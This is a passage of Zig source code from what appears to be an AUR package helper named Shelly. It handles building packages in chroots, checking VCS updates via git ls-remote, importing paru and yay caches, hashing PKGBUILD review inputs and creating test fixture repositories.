            try builder.invokingUserCommand(self.allocator, self.io(), self.environ, command_path, &.{})
        else if (historical and !self.use_chroot)
            try builder.makepkgHistoricalCommand(self.allocator, self.io(), self.environ, self.no_check)
        else
            try builder.makepkgCommand(self.allocator, self.io(), self.environ, self.use_chroot, self.chroot_path, self.no_check);
        defer command.deinit(self.allocator);
        var stream_context = BuildStreamContext{ .manager = self, .package_name = package_name };
        const exit_code = try builder.runStreamingWithEnvironmentOperation(
            self.allocator,
            self.io(),
            self.environ,
            command.asConst(),
            cache_path,
            null,
            .{ .function = forwardBuildLine, .data = &stream_context },
            self.dispatcher.operation,
        );
        return exit_code == 0;
    }

    fn ensureChrootExists(self: *Self) !void {
        const root = try std.fs.path.join(self.allocator, &.{ self.chroot_path, "root" });
        defer self.allocator.free(root);
        if (std.Io.Dir.cwd().statFile(self.io(), root, .{})) |_| {
            var update = try builder.runWithEnvironment(self.allocator, self.io(), self.environ, &.{ "arch-nspawn", root, "shelly", "upgrade", "-n" }, null, null);
            defer update.deinit(self.allocator);
        } else |_| {
            try std.Io.Dir.cwd().createDirPath(self.io(), self.chroot_path);
            var create = try builder.runWithEnvironment(self.allocator, self.io(), self.environ, &.{ "mkarchroot", root, "base-devel" }, null, null);
            defer create.deinit(self.allocator);
            if (create.exit_code != 0) return error.ChrootFailed;
        }
        const destination = try std.fs.path.join(self.allocator, &.{ root, "etc", "makepkg.conf" });
        defer self.allocator.free(destination);
        var copy = try builder.runWithEnvironment(self.allocator, self.io(), self.environ, &.{ "cp", "/etc/makepkg.conf", destination }, null, null);
        defer copy.deinit(self.allocator);
        if (copy.exit_code != 0) return error.ChrootFailed;
    }

    fn preferBinaryVariant(self: *Self, dependency: ParsedDependency) !ParsedDependency {
        if (hasNoBinRemapSuffix(dependency.name)) return dependency_resolver.cloneDependency(self.allocator, dependency);
        if (self.bin_variant_cache.get(dependency.name)) |cached| {
            var clone = try dependency_resolver.cloneDependency(self.allocator, dependency);
            if (cached) |name| {
                self.allocator.free(clone.name);
                clone.name = try self.allocator.dupe(u8, name);
            }
            return clone;
        }
        const bin_name = try std.fmt.allocPrint(self.allocator, "{s}-bin", .{dependency.name});
        defer self.allocator.free(bin_name);
        var resolved: ?[]const u8 = null;
        if (self.aur_client.getInfo(&.{bin_name})) |response_value| {
            var response = response_value;
            defer response.deinit(self.allocator);
            if (response.results.len > 0) {
                const candidate = response.results[0];
                if (std.mem.eql(u8, candidate.name, bin_name) and candidate.maintainer != null and candidate.maintainer.?.len > 0) {
                    if (dependency.operator.len == 0 or try version.satisfies(self.allocator, candidate.version, dependency.operator, dependency.version))
                        resolved = candidate.name;
                }
            }
        } else |_| {}
        const cache_key = try self.allocator.dupe(u8, dependency.name);
        errdefer self.allocator.free(cache_key);
        const cache_value = if (resolved) |name| try self.allocator.dupe(u8, name) else null;
        try self.bin_variant_cache.put(cache_key, cache_value);
        var clone = try dependency_resolver.cloneDependency(self.allocator, dependency);
        if (resolved) |name| {
            self.allocator.free(clone.name);
            clone.name = try self.allocator.dupe(u8, name);
        }
        return clone;
    }

    fn getVcsSourceEntries(self: *Self, package_name: []const u8) !?[]vcs.SourceEntry {
        const package_base = try self.resolvePkgbase(package_name);
        const cache_path = try self.cachePath(package_base);
        defer self.allocator.free(cache_path);
        const path = try std.fs.path.join(self.allocator, &.{ cache_path, "PKGBUILD" });
        defer self.allocator.free(path);
        _ = std.Io.Dir.cwd().statFile(self.io(), path, .{}) catch {
            if (!(try self.downloadPackage(package_name))) return null;
        };
        var info = try (pkgbuild_parser.PkgbuildParser{ .allocator = self.allocator, .io = self.io() }).parser(path);
        defer info.deinit(self.allocator);
        const sources = info.source orelse return null;
        const entries = try vcs.parseSources(self.allocator, sources, &info.variables);
        return if (entries.len == 0) blk: {
            self.allocator.free(entries);
            break :blk null;
        } else entries;
    }

    fn getRemoteCommitSha(self: *Self, url: []const u8, branch: []const u8) !?[]u8 {
        const remote = try fetchRemoteSha(null, self.io(), self.environ, url, branch) orelse return null;
        return @as(?[]u8, try self.allocator.dupe(u8, remote.slice()));
    }

    fn updateVcsStoreForPackage(self: *Self, package_name: []const u8, _: []const u8) !void {
        if (!isVcsPackage(package_name)) return;
        const entries = try self.getVcsSourceEntries(package_name) orelse return;
        defer vcs.deinitEntries(self.allocator, entries);
        for (entries) |*entry| {
            if (try self.getRemoteCommitSha(entry.url, entry.branch)) |sha| {
                self.allocator.free(entry.commit_sha);
                entry.commit_sha = sha;
            }
        }
        try self.vcs_store.set(package_name, entries);
        try self.vcs_store.saveFile(self.io(), self.vcs_store_path);
    }

    fn importOtherAurHelperCaches(self: *Self) !void {
        const home = try builder.resolveInvokingUserHome(self.allocator, self.io(), self.environ);
        defer self.allocator.free(home);
        const foreign = try self.alpm.get_foreign_packages();
        defer alpm_bindings.libalpm.OwnedPackage.deinitSlice(self.allocator, foreign);
        for ([_][]const u8{ ".cache/paru/clone", ".cache/yay" }) |relative| {
            const source = try std.fs.path.join(self.allocator, &.{ home, relative });
            defer self.allocator.free(source);
            try self.importHelperCache(source, foreign);
        }
    }

    fn importHelperCache(self: *Self, source_root: []const u8, foreign: []const alpm_bindings.libalpm.OwnedPackage) !void {
        var directory = std.Io.Dir.cwd().openDir(self.io(), source_root, .{ .iterate = true }) catch return;
        defer directory.close(self.io());
        var iterator = directory.iterate();
        while (try iterator.next(self.io())) |entry| {
            if (entry.kind != .directory) continue;
            const source = try std.fs.path.join(self.allocator, &.{ source_root, entry.name });
            defer self.allocator.free(source);
            const pkgbuild = try std.fs.path.join(self.allocator, &.{ source, "PKGBUILD" });
            defer self.allocator.free(pkgbuild);
            _ = std.Io.Dir.cwd().statFile(self.io(), pkgbuild, .{}) catch continue;
            var identity = try self.resolveCloneIdentity(source, entry.name);
            defer identity.deinit(self.allocator);
            var installed = false;
            const identity_names: []const []const u8 = @ptrCast(identity.package_names);
            for (foreign) |package| if (cloneIdentityMatches(identity.package_base, identity_names, package.name() orelse "")) {
                installed = true;
                break;
            };
            if (!installed) continue;
            const destination = try self.cachePath(identity.package_base);
            defer self.allocator.free(destination);
            if (std.Io.Dir.cwd().statFile(self.io(), destination, .{})) |_| continue else |_| {}
            var copy = try builder.runWithEnvironment(self.allocator, self.io(), self.environ, &.{ "cp", "-r", source, destination }, null, null);
            defer copy.deinit(self.allocator);
            if (copy.exit_code == 0) {
                const git = try std.fs.path.join(self.allocator, &.{ destination, ".git" });
                defer self.allocator.free(git);
                _ = self.removeCacheDirectory(git) catch false;
            }
        }
    }

    fn resolveCloneIdentity(self: *Self, clone_directory: []const u8, fallback: []const u8) !CloneIdentity {
        const path = try std.fs.path.join(self.allocator, &.{ clone_directory, ".SRCINFO" });
        defer self.allocator.free(path);
        if (srcinfo.parseFile(self.allocator, self.io(), path)) |info_value| {
            var info = info_value;
            defer info.deinit(self.allocator);
            if (info.package_base) |base| return CloneIdentity.init(self.allocator, base, info.package_names);
        } else |_| {}

        const git_directory = try std.fs.path.join(self.allocator, &.{ clone_directory, ".git" });
        defer self.allocator.free(git_directory);
        if (std.Io.Dir.cwd().statFile(self.io(), git_directory, .{})) |_| {
            var remote = try self.runAsInvokingUser(&.{ "git", "-C", clone_directory, "remote", "get-url", "origin" }, null, null);
            defer remote.deinit(self.allocator);
            if (remote.exit_code == 0) {
                if (try parseAurGitRemote(self.allocator, std.mem.trim(u8, remote.stdout, " \t\r\n"))) |package_base| {
                    defer self.allocator.free(package_base);
                    return CloneIdentity.init(self.allocator, package_base, &.{});
                }
            }
        } else |_| {}
        return CloneIdentity.init(self.allocator, fallback, &.{});
    }

    fn cachePath(self: *Self, package_base: []const u8) ![]u8 {
        return std.fs.path.join(self.allocator, &.{ self.cache_root, package_base });
    }

    fn runAsInvokingUser(
        self: *Self,
        command_and_args: []const []const u8,
        working_directory: ?[]const u8,
        timeout_seconds: ?u32,
    ) !builder.ProcessResult {
        if (command_and_args.len == 0) return error.EmptyCommand;
        var command = try builder.invokingUserCommand(
            self.allocator,
            self.io(),
            self.environ,
            command_and_args[0],
            command_and_args[1..],
        );
        defer command.deinit(self.allocator);
        return builder.runWithEnvironment(self.allocator, self.io(), self.environ, command.asConst(), working_directory, timeout_seconds);
    }

    fn raisePackageProgress(
        self: *Self,
        event_type: events.EventType,
        package_name: []const u8,
        current: usize,
        total: usize,
        message: []const u8,
    ) void {
        self.raiseInfo(event_type, package_name, message, current, total);
    }

    fn raiseBuildLine(self: *Self, package_name: []const u8, line: []const u8, is_error: bool) void {
        self.raiseInfo(if (is_error) .aur_build_error else .aur_build_output, package_name, line, null, null);
    }

    fn raiseBestEffortFailure(self: *Self, package_name: []const u8, context: []const u8, err: anyerror) void {
        const message = std.fmt.allocPrint(self.allocator, "[Shelly] Warning: {s}: {s}", .{ context, @errorName(err) }) catch {
            self.raiseBuildLine(package_name, "[Shelly] Warning: a best-effort AUR operation failed", true);
            return;
        };
        defer self.allocator.free(message);
        self.raiseBuildLine(package_name, message, true);
    }

    fn raiseInfo(
        self: *Self,
        event_type: events.EventType,
        package_name: ?[]const u8,
        message: []const u8,
        current: ?usize,
        total: ?usize,
    ) void {
        self.dispatcher.raiseInformational(.{
            .event_type = event_type,
            .message = message,
            .package_name = package_name,
            .current = current,
            .total = total,
        });
    }

    fn checkCancelled(self: *Self) error{Cancelled}!void {
        if (self.dispatcher.operation) |operation| try operation.checkCancelled();
        if (self.operation_context) |context| {
            if (context.isCancelled()) return error.Cancelled;
        }
    }
};

const OperationScope = struct {
    manager: *Manager,
    operation: ?operation_api.Operation = null,
    previous: ?*operation_api.Operation = null,
    previous_alpm: ?*operation_api.Operation = null,
    previous_rpc: ?*const operation_api.Operation = null,
    attached: bool = false,

    fn init(manager: *Manager, kind: operation_api.OperationKind, subject: ?[]const u8) OperationScope {
        var scope: OperationScope = .{
            .manager = manager,
            .previous = manager.dispatcher.operation,
            .previous_alpm = manager.alpm.dispatcher.operation,
            .previous_rpc = manager.aur_client.parent_operation,
        };
        if (scope.previous) |parent| {
            scope.operation = parent.child(.{ .backend = .aur, .kind = kind, .subject = subject });
        } else if (manager.operation_context) |context| {
            scope.operation = context.begin(.{ .backend = .aur, .kind = kind, .subject = subject });
        }
        return scope;
    }

    fn attach(self: *OperationScope) void {
        if (self.operation) |*operation| {
            self.manager.dispatcher.setOperation(operation);
            self.manager.alpm.dispatcher.setOperation(operation);
            self.manager.aur_client.setParentOperation(operation);
        }
        self.attached = true;
    }

    fn fail(self: *OperationScope) void {
        if (self.operation) |*operation| {
            if (!operation.isCancelled()) operation.reportError(
                error.AurOperationFailed,
                "AUR operation failed",
                "aur",
                null,
                false,
            );
        }
        const status: operation_api.CompletionStatus = if (self.operation) |*operation|
            if (operation.isCancelled()) .cancelled else .failed
        else
            .failed;
        self.finish(status);
    }

    fn finish(self: *OperationScope, status: operation_api.CompletionStatus) void {
        if (self.operation) |*operation| operation.finish(status);
        if (self.attached) {
            self.manager.dispatcher.setOperation(self.previous);
            self.manager.alpm.dispatcher.setOperation(self.previous_alpm);
            self.manager.aur_client.setParentOperation(self.previous_rpc);
            self.attached = false;
        }
    }
};

const max_concurrent_vcs_checks = 15;
const max_remote_sha_length = 128;

const RemoteSha = struct {
    bytes: [max_remote_sha_length]u8 = undefined,
    len: u8 = 0,

    fn fromSlice(value: []const u8) ?RemoteSha {
        if (value.len == 0 or value.len > max_remote_sha_length) return null;
        var result = RemoteSha{};
        @memcpy(result.bytes[0..value.len], value);
        result.len = @intCast(value.len);
        return result;
    }

    fn slice(self: *const RemoteSha) []const u8 {
        return self.bytes[0..self.len];
    }
};

fn installedVcsCommit(installed_version: []const u8) ?[]const u8 {
    const marker = std.mem.lastIndexOf(u8, installed_version, ".g") orelse return null;
    const start = marker + 2;
    var end = start;
    while (end < installed_version.len and std.ascii.isHex(installed_version[end])) : (end += 1) {}
    if (end - start < 7) return null;
    return installed_version[start..end];
}

fn firstSeenVcsNeedsUpdate(installed_version: []const u8, remote_shas: []const RemoteSha) bool {
    const installed_commit = installedVcsCommit(installed_version) orelse return false;
    var fetched_any = false;
    for (remote_shas) |*remote_sha| {
        const sha = remote_sha.slice();
        if (sha.len == 0) continue;
        fetched_any = true;
        if (sha.len >= installed_commit.len and
            std.ascii.eqlIgnoreCase(sha[0..installed_commit.len], installed_commit))
        {
            return false;
        }
    }
    return fetched_any;
}

const VcsCheckCandidate = struct {
    package_name: []const u8,
    installed_index: usize,
    entries: []const vcs.SourceEntry,
    owned_entries: ?[]vcs.SourceEntry,
    remote_shas: []RemoteSha,
    first_seen: bool,
    needs_update: bool = false,

    fn init(
        allocator: std.mem.Allocator,
        package_name: []const u8,
        installed_index: usize,
        entries: []const vcs.SourceEntry,
        owned_entries: ?[]vcs.SourceEntry,
    ) !VcsCheckCandidate {
        const remote_shas = try allocator.alloc(RemoteSha, entries.len);
        @memset(remote_shas, RemoteSha{});
        return .{
            .package_name = package_name,
            .installed_index = installed_index,
            .entries = entries,
            .owned_entries = owned_entries,
            .remote_shas = remote_shas,
            .first_seen = owned_entries != null,
        };
    }

    fn deinit(self: *VcsCheckCandidate, allocator: std.mem.Allocator) void {
        if (self.owned_entries) |entries| vcs.deinitEntries(allocator, entries);
        allocator.free(self.remote_shas);
        self.* = undefined;
    }
};

const VcsRemoteFetcher = struct {
    function: *const fn (
        data: ?*anyopaque,
        io: std.Io,
        environ: std.process.Environ,
        url: []const u8,
        branch: []const u8,
    ) anyerror!?RemoteSha,
    data: ?*anyopaque = null,
};

fn fetchRemoteSha(
    _: ?*anyopaque,
    io: std.Io,
    environ: std.process.Environ,
    url: []const u8,
    branch: []const u8,
) !?RemoteSha {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();
    var args: std.ArrayList([]const u8) = .empty;
    try args.appendSlice(allocator, &.{ "git", "ls-remote", url });
    if (branch.len != 0) try args.append(allocator, branch);
    const result = try builder.runWithEnvironment(allocator, io, environ, args.items, null, 15);
    if (result.exit_code != 0) return null;
    const line_end = std.mem.indexOfScalar(u8, result.stdout, '\n') orelse result.stdout.len;
    const line = result.stdout[0..line_end];
    const tab = std.mem.indexOfScalar(u8, line, '\t') orelse return null;
    return RemoteSha.fromSlice(std.mem.trim(u8, line[0..tab], " \t\r"));
}

fn runVcsCheck(
    io: std.Io,
    environ: std.process.Environ,
    candidate: *VcsCheckCandidate,
    fetcher: VcsRemoteFetcher,
) void {
    for (candidate.entries, candidate.remote_shas) |entry, *remote_sha| {
        const fetched = fetcher.function(fetcher.data, io, environ, entry.url, entry.branch) catch continue;
        remote_sha.* = fetched orelse continue;
        if (!candidate.first_seen and entry.commit_sha.len != 0 and
            !std.mem.eql(u8, remote_sha.slice(), entry.commit_sha))
        {
            candidate.needs_update = true;
        }
    }
}

fn backfillMissingVcsBaselines(store: *vcs.Store, candidate: *const VcsCheckCandidate) !bool {
    var changed = false;
    for (candidate.entries, candidate.remote_shas, 0..) |entry, *remote_sha, source_index| {
        const sha = remote_sha.slice();
        if (entry.commit_sha.len != 0 or sha.len == 0) continue;
        if (try store.setCommitSha(candidate.package_name, source_index, sha)) changed = true;
    }
    return changed;
}

fn runVcsChecksConcurrently(
    io: std.Io,
    environ: std.process.Environ,
    candidates: []VcsCheckCandidate,
    fetcher: VcsRemoteFetcher,
) void {
    const VcsFuture = std.Io.Future(void);
    var futures: [max_concurrent_vcs_checks]VcsFuture = undefined;
    var future_count: usize = 0;

    for (candidates) |*candidate| {
        if (future_count == futures.len) {
            for (futures[0..future_count]) |*future| future.await(io);
            future_count = 0;
        }
        const future = io.concurrent(runVcsCheck, .{ io, environ, candidate, fetcher }) catch {
            runVcsCheck(io, environ, candidate, fetcher);
            continue;
        };
        futures[future_count] = future;
        future_count += 1;
    }
    for (futures[0..future_count]) |*future| future.await(io);
}

const BuildStreamContext = struct {
    manager: *Manager,
    package_name: []const u8,
};

fn forwardBuildLine(data: ?*anyopaque, stream: builder.StreamKind, line: []const u8) void {
    const context: *BuildStreamContext = @ptrCast(@alignCast(data));
    context.manager.raiseBuildLine(context.package_name, line, stream == .stderr);
    if (stream == .stdout) if (builder.parseBuildProgress(line)) |progress| {
        context.manager.dispatcher.raiseProgress(.{
            .progress_type = .makepkg_build,
            .package_name = context.package_name,
            .percent = progress.percent,
            .message = progress.message,
        });
    };
}

const PreparedInstall = struct {
    prepared: PreparedPackage,
    dependencies: DependencyCollection,
    requested_names: std.ArrayList([]u8) = .empty,
    selected_optional: ?[][]const u8 = null,

    fn addRequestedName(
        self: *PreparedInstall,
        allocator: std.mem.Allocator,
        package_name: []const u8,
    ) !void {
        for (self.requested_names.items) |existing|
            if (std.mem.eql(u8, existing, package_name)) return;
        const owned_name = try allocator.dupe(u8, package_name);
        self.requested_names.append(allocator, owned_name) catch |err| {
            allocator.free(owned_name);
            return err;
        };
    }

    fn deinit(self: *PreparedInstall, allocator: std.mem.Allocator) void {
        if (self.selected_optional) |selected| allocator.free(selected);
        for (self.requested_names.items) |name| allocator.free(name);
        self.requested_names.deinit(allocator);
        self.dependencies.deinit();
        self.prepared.deinit(allocator);
        self.* = undefined;
    }
};

const CollectedRepoDependency = struct {
    name: []u8,
    role: dependency_resolver.Role,
};

const CollectedAurDependency = struct {
    prepared: PreparedPackage,
    role: dependency_resolver.Role,
};

const DependencyCollection = struct {
    allocator: std.mem.Allocator,
    repo: std.ArrayList(CollectedRepoDependency) = .empty,
    aur: std.ArrayList(CollectedAurDependency) = .empty,

    fn init(allocator: std.mem.Allocator) DependencyCollection {
        return .{ .allocator = allocator };
    }

    fn deinit(self: *DependencyCollection) void {
        for (self.repo.items) |dependency| self.allocator.free(dependency.name);
        self.repo.deinit(self.allocator);
        for (self.aur.items) |*dependency| dependency.prepared.deinit(self.allocator);
        self.aur.deinit(self.allocator);
    }

    fn addRepo(self: *DependencyCollection, name: []const u8, role: dependency_resolver.Role) !void {
        for (self.repo.items) |*dependency| {
            if (!std.mem.eql(u8, dependency.name, name)) continue;
            dependency.role = strongerDependencyRole(dependency.role, role);
            return;
        }
        try self.repo.append(self.allocator, .{
            .name = try self.allocator.dupe(u8, name),
            .role = role,
        });
    }

    fn addAur(
        self: *DependencyCollection,
        dependency: *PreparedPackage,
        role: dependency_resolver.Role,
    ) !void {
        for (self.aur.items) |*existing| {
            if (std.mem.eql(u8, existing.prepared.package_base, dependency.package_base) and
                std.mem.eql(u8, existing.prepared.target_commit, dependency.target_commit))
            {
                existing.role = strongerDependencyRole(existing.role, role);
                dependency.deinit(self.allocator);
                return;
            }
        }
        try self.aur.append(self.allocator, .{
            .prepared = dependency.*,
            .role = role,
        });
        dependency.* = undefined;
    }
};

const CloneIdentity = struct {
    package_base: []u8,
    package_names: [][]u8,

    fn init(allocator: std.mem.Allocator, package_base: []const u8, package_names: []const []u8) !CloneIdentity {
        const owned_base = try allocator.dupe(u8, package_base);
        errdefer allocator.free(owned_base);
        var owned_names: std.ArrayList([]u8) = .empty;
        errdefer {
            for (owned_names.items) |name| allocator.free(name);
            owned_names.deinit(allocator);
        }
        for (package_names) |name| try owned_names.append(allocator, try allocator.dupe(u8, name));
        return .{
            .package_base = owned_base,
            .package_names = try owned_names.toOwnedSlice(allocator),
        };
    }

    fn deinit(self: *CloneIdentity, allocator: std.mem.Allocator) void {
        allocator.free(self.package_base);
        for (self.package_names) |name| allocator.free(name);
        allocator.free(self.package_names);
        self.* = undefined;
    }
};

fn cloneIdentityMatches(package_base: []const u8, package_names: []const []const u8, installed_name: []const u8) bool {
    if (std.mem.eql(u8, package_base, installed_name)) return true;
    for (package_names) |name| if (std.mem.eql(u8, name, installed_name)) return true;
    return false;
}

fn resolveXdgHome(
    allocator: std.mem.Allocator,
    io: std.Io,
    environ: std.process.Environ,
    variable_name: []const u8,
    fallback_relative: []const u8,
) ![]u8 {
    if (environ.getPosix(variable_name)) |configured| {
        if (configured.len != 0 and std.fs.path.isAbsolute(configured)) return allocator.dupe(u8, configured);
    }
    const home = try builder.resolveInvokingUserHome(allocator, io, environ);
    defer allocator.free(home);
    return std.fs.path.join(allocator, &.{ home, fallback_relative });
}

fn hashReviewField(
    hash: *std.crypto.hash.sha2.Sha256,
    name: []const u8,
    content: []const u8,
) void {
    const name_length: u64 = @intCast(name.len);
    const content_length: u64 = @intCast(content.len);
    hash.update(std.mem.asBytes(&name_length));
    hash.update(name);
    hash.update(std.mem.asBytes(&content_length));
    hash.update(content);
}

fn requireReviewInputs(
    allocator: std.mem.Allocator,
    io: std.Io,
    cache_path: []const u8,
    info: *const PkgbuildInfo,
) !void {
    if (info.install_file) |install_file|
        try requireReviewedFile(allocator, io, cache_path, install_file);
    if (info.local_source_files) |files| for (files) |file_name| {
        try requireReviewedFile(allocator, io, cache_path, file_name);
        if (!info.local_source_contents.contains(file_name)) return error.MissingPkgbuildSourceFile;
    };
}

fn requireReviewedFile(
    allocator: std.mem.Allocator,
    io: std.Io,
    cache_path: []const u8,
    file_name: []const u8,
) !void {
    if (file_name.len == 0 or std.fs.path.isAbsolute(file_name))
        return error.UnsafePkgbuildSourcePath;
    const path = try std.fs.path.join(allocator, &.{ cache_path, file_name });
    defer allocator.free(path);
    const status = std.Io.Dir.cwd().statFile(io, path, .{ .follow_symlinks = false }) catch |err| switch (err) {
        error.FileNotFound => return error.MissingPkgbuildSourceFile,
        else => return err,
    };
    if (status.kind != .file) return error.UnsafePkgbuildSourcePath;
    const canonical_root = try std.Io.Dir.cwd().realPathFileAlloc(io, cache_path, allocator);
    defer allocator.free(canonical_root);
    const canonical_file = try std.Io.Dir.cwd().realPathFileAlloc(io, path, allocator);
    defer allocator.free(canonical_file);
    if (!pathIsInside(canonical_root, canonical_file)) return error.UnsafePkgbuildSourcePath;
}

fn pathIsInside(root: []const u8, candidate: []const u8) bool {
    return candidate.len > root.len and
        std.mem.startsWith(u8, candidate, root) and
        std.fs.path.isSep(candidate[root.len]);
}

fn reviewDigest(
    allocator: std.mem.Allocator,
    io: std.Io,
    cache_path: []const u8,
    pkgbuild_content: []const u8,
    info: *const PkgbuildInfo,
) ![std.crypto.hash.sha2.Sha256.digest_length]u8 {
    var hash = std.crypto.hash.sha2.Sha256.init(.{});
    hashReviewField(&hash, "PKGBUILD", pkgbuild_content);
    if (info.install_file) |install_file|
        try hashReviewedFile(allocator, io, &hash, cache_path, install_file);
    if (info.local_source_files) |files| for (files) |file_name|
        try hashReviewedFile(allocator, io, &hash, cache_path, file_name);
    var digest: [std.crypto.hash.sha2.Sha256.digest_length]u8 = undefined;
    hash.final(&digest);
    return digest;
}

fn hashReviewedFile(
    allocator: std.mem.Allocator,
    io: std.Io,
    hash: *std.crypto.hash.sha2.Sha256,
    cache_path: []const u8,
    file_name: []const u8,
) !void {
    try requireReviewedFile(allocator, io, cache_path, file_name);
    const path = try std.fs.path.join(allocator, &.{ cache_path, file_name });
    defer allocator.free(path);
    const content = try std.Io.Dir.cwd().readFileAlloc(io, path, allocator, .limited(max_file_size));
    defer allocator.free(content);
    hashReviewField(hash, file_name, content);
}

fn parseAurGitRemote(allocator: std.mem.Allocator, remote: []const u8) !?[]u8 {
    const prefix = "https://aur.archlinux.org/";
    if (!std.mem.startsWith(u8, remote, prefix)) return null;
    var package_base = std.mem.trim(u8, remote[prefix.len..], " /\t\r\n");
    if (std.mem.endsWith(u8, package_base, ".git")) package_base = package_base[0 .. package_base.len - 4];
    if (package_base.len == 0) return null;
    return @as(?[]u8, try allocator.dupe(u8, package_base));
}

fn isVcsPackage(package_name: []const u8) bool {
    for ([_][]const u8{ "-git", "-svn", "-hg", "-bzr", "-darcs", "-cvs" }) |suffix|
        if (endsWithIgnoreCase(package_name, suffix)) return true;
    return false;
}

fn hasNoBinRemapSuffix(package_name: []const u8) bool {
    return endsWithIgnoreCase(package_name, "-bin") or isVcsPackage(package_name);
}

fn endsWithIgnoreCase(value: []const u8, suffix: []const u8) bool {
    return value.len >= suffix.len and std.ascii.eqlIgnoreCase(value[value.len - suffix.len ..], suffix);
}

fn containsUpdate(updates: []const models.Update, name: []const u8) bool {
    for (updates) |update| if (std.mem.eql(u8, update.name, name)) return true;
    return false;
}

fn findPackage(packages: []const models.Package, name: []const u8) ?*const models.Package {
    for (packages) |*package| if (std.mem.eql(u8, package.name, name)) return package;
    return null;
}

fn containsMutable(values: []const []u8, expected: []const u8) bool {
    for (values) |value| if (std.mem.eql(u8, value, expected)) return true;
    return false;
}

fn strongerDependencyRole(
    lhs: dependency_resolver.Role,
    rhs: dependency_resolver.Role,
) dependency_resolver.Role {
    if (lhs == .runtime or rhs == .runtime) return .runtime;
    if (lhs == .build or rhs == .build) return .build;
    return .check;
}

fn transactionRole(role: dependency_resolver.Role) operation_api.TransactionPackageRole {
    return switch (role) {
        .runtime => .runtime_dependency,
        .build => .build_dependency,
        .check => .check_dependency,
    };
}

fn appendTransactionPackage(
    packages: *std.ArrayList(operation_api.TransactionPackage),
    allocator: std.mem.Allocator,
    package: operation_api.TransactionPackage,
) !void {
    for (packages.items) |*existing| {
        if (existing.source != package.source or !std.mem.eql(u8, existing.name, package.name)) continue;
        if (transactionRolePriority(package.role) > transactionRolePriority(existing.role))
            existing.role = package.role;
        return;
    }
    try packages.append(allocator, package);
}

fn transactionRolePriority(role: operation_api.TransactionPackageRole) u8 {
    return switch (role) {
        .requested => 6,
        .runtime_dependency => 5,
        .optional_dependency => 4,
        .build_dependency => 3,
        .check_dependency => 2,
        .dependency => 1,
    };
}

fn containsConst(values: []const []const u8, expected: []const u8) bool {
    for (values) |value| if (std.mem.eql(u8, value, expected)) return true;
    return false;
}

fn runFixtureCommand(
    allocator: std.mem.Allocator,
    io: std.Io,
    argv: []const []const u8,
    working_directory: ?[]const u8,
) !void {
    var result = try builder.run(allocator, io, argv, working_directory, null);
    defer result.deinit(allocator);
    if (result.exit_code != 0) {
        std.debug.print("fixture command failed ({d}): {s}\n", .{ result.exit_code, result.stderr });
        return error.FixtureCommandFailed;
    }
}

fn writeFixtureFile(io: std.Io, path: []const u8, content: []const u8, executable: bool) !void {
    var file = try std.Io.Dir.cwd().createFile(io, path, .{
        .permissions = if (executable)
            @as(std.Io.File.Permissions, @enumFromInt(0o755))
        else
            .default_file,
    });
    defer file.close(io);
    try file.writeStreamingAll(io, content);
}

fn createAurFixtureRepository(
    allocator: std.mem.Allocator,
    io: std.Io,
    remote_root: []const u8,
    package_name: []const u8,
    dependency: ?[]const u8,
) !void {
    const remote_name = try std.fmt.allocPrint(allocator, "{s}.git", .{package_name});
    defer allocator.free(remote_name);
    const remote = try std.fs.path.join(allocator, &.{ remote_root, remote_name });
    defer allocator.free(remote);
    try std.Io.Dir.cwd().createDirPath(io, remote);

    const pkgbuild_path = try std.fs.path.join(allocator, &.{ remote, "PKGBUILD" });
    defer allocator.free(pkgbuild_path);
    const depends = if (dependency) |name|
        try std.fmt.allocPrint(allocator, "depends=('{s}')\n", .{name})
    else
        try allocator.dupe(u8, "");
    defer allocator.free(depends);
    const pkgbuild = try std.fmt.allocPrint(
        allocator,
        "pkgname={s}\npkgver=1\npkgrel=1\narch=('any')\n{s}package() {{ :; }}\n",
        .{ package_name, depends },
    );
    defer allocator.free(pkgbuild);
    try writeFixtureFile(io, pkgbuild_path, pkgbuild, false);

    const srcinfo_path = try std.fs.path.join(allocator, &.{ remote, ".SRCINFO" });
    defer allocator.free(srcinfo_path);
    const srcinfo_depends = if (dependency) |name|
        try std.fmt.allocPrint(allocator, "\tdepends = {s}\n", .{name})
    else
        try allocator.dupe(u8, "");
    defer allocator.free(srcinfo_depends);
    const srcinfo_content = try std.fmt.allocPrint(
        allocator,
        "pkgbase = {s}\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n{s}pkgname = {s}\n",
        .{ package_name, srcinfo_depends, package_name },
    );
    defer allocator.free(srcinfo_content);
    try writeFixtureFile(io, srcinfo_path, srcinfo_content, false);

    try runFixtureCommand(allocator, io, &.{ "git", "init" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.email", "shelly-tests@example.invalid" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.name", "Shelly Tests" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "add", "PKGBUILD", ".SRCINFO" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "commit", "-m", "fixture" }, remote);
}

fn createSplitAurFixtureRepository(
    allocator: std.mem.Allocator,
    io: std.Io,
    remote_root: []const u8,
    package_base: []const u8,
    package_names: []const []const u8,
) !void {
    const remote_name = try std.fmt.allocPrint(allocator, "{s}.git", .{package_base});
    defer allocator.free(remote_name);
    const remote = try std.fs.path.join(allocator, &.{ remote_root, remote_name });
    defer allocator.free(remote);
    try std.Io.Dir.cwd().createDirPath(io, remote);

    var pkgbuild = std.Io.Writer.Allocating.init(allocator);
    defer pkgbuild.deinit();
    try pkgbuild.writer.writeAll("pkgname=(");
    for (package_names) |name| try pkgbuild.writer.print("'{s}' ", .{name});
    try pkgbuild.writer.writeAll(")\npkgver=1\npkgrel=1\narch=('any')\npackage() { :; }\n");
    const pkgbuild_path = try std.fs.path.join(allocator, &.{ remote, "PKGBUILD" });
    defer allocator.free(pkgbuild_path);
    try writeFixtureFile(io, pkgbuild_path, pkgbuild.writer.buffered(), false);

    var srcinfo_content = std.Io.Writer.Allocating.init(allocator);
    defer srcinfo_content.deinit();
    try srcinfo_content.writer.print(
        "pkgbase = {s}\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n",
        .{package_base},
    );
    for (package_names) |name| try srcinfo_content.writer.print("pkgname = {s}\n", .{name});
    const srcinfo_path = try std.fs.path.join(allocator, &.{ remote, ".SRCINFO" });
    defer allocator.free(srcinfo_path);
    try writeFixtureFile(io, srcinfo_path, srcinfo_content.writer.buffered(), false);

